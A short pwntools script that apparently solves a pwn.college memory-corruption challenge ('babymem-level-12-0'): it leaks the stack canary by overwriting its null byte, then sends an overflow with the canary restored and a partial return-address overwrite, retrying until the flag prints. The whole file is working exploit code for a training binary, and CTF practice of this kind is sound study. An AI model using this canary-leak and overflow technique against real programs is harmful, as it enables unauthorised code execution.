from pwn import *

while True:
  p = process('/challenge/babymem-level-12-0')
  p.recvuntil(b'Payload size:')
  p.sendline(b'500')

  payload = b'REPEAT' + b'A' * 114

  p.recvline(b'Send your payload')
  p.sendline(payload)

  p.recvuntil(payload +b'\n')
  cnry = u64(b'\0' + p.recvn(7))
  log.info('Canary: ' + hex(cnry))

  pl =  b'B' * 0x78 + p64(cnry) + b'B' * 8 + p16(0x2218)
  p.sendline(b'500')
  p.send(pl)
# p.interactive()
  flag = p.recvall(1)
    #print(str)
  if flag.find(b'pwn.college{') != -1:
    print(flag)
    break
